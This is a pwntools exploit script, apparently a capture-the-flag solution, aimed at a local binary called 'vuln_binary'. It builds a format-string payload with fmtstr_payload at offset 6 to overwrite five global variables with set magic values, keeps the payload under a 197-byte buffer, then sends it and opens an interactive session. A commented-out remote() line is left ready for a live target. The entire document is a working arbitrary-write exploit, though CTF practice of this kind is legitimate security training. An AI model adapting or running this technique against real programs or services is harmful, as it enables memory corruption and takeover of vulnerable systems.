from pwn import *
import ctypes

# Set up the binary context
exe = ELF('./vuln_binary')
context.binary = exe
context.log_level = 'info'

# 1. Get the static addresses of the target variables (No PIE)
arg1_addr = exe.symbols['arg1']
arg2_addr = exe.symbols['arg2']
arg3_addr = exe.symbols['arg3']
arg4_addr = exe.symbols['arg4']
arg5_addr = exe.symbols['arg5']

log.info(f"Targeting addresses starting at: {hex(arg1_addr)}")

# 2. Define the Offset
offset = 6

# Helper to convert signed ints to unsigned 32-bit integers
def get_val(v):
    return ctypes.c_uint32(v).value

# 3. Define the values we need to write
writes = {
    arg1_addr: get_val(-0x21524111), # 0xDEADBEEF
    arg2_addr: get_val(0x1337c0de),  # 0x1337C0DE
    arg3_addr: get_val(-0xcc84542),  # 0xF337BABE
    arg4_addr: get_val(0x1337f337),  # 0x1337F337
    arg5_addr: get_val(-0x5211113)   # 0xFADEEEED
}

# 4. Generate the payload
# We use 'short' (2 bytes) writes to optimize payload size
payload = fmtstr_payload(offset, writes, write_size='short')

# Check if we fit inside the 197 byte buffer
if len(payload) > 197:
    log.warning(f"Payload length {len(payload)} is too large! Trying byte optimization...")
    payload_byte = fmtstr_payload(offset, writes, write_size='byte')
    if len(payload_byte) < len(payload):
        log.info(f"Switched to byte writes. New length: {len(payload_byte)}")
        payload = payload_byte

log.info(f"Final Payload length: {len(payload)}")

# 5. Send the exploit
# p = remote('IP', PORT) 
p = process(exe.path) # For local testing
p.recvuntil(b"> ")
p.sendline(payload)
p.interactive()
